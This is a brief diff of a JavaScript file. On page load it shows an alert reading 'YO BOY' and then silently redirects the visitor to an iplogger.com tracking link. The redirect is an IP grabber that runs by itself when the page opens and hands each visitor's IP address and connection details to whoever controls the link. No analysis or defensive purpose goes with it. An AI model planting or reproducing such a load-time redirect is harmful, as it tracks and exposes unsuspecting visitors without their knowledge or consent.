@@ -1,4 +1,5 @@
 window.addEventListener("load", ()=>{
+    alert("YO BOY");
     location.replace("https://iplogger.com/2VEkD5")
 })
 
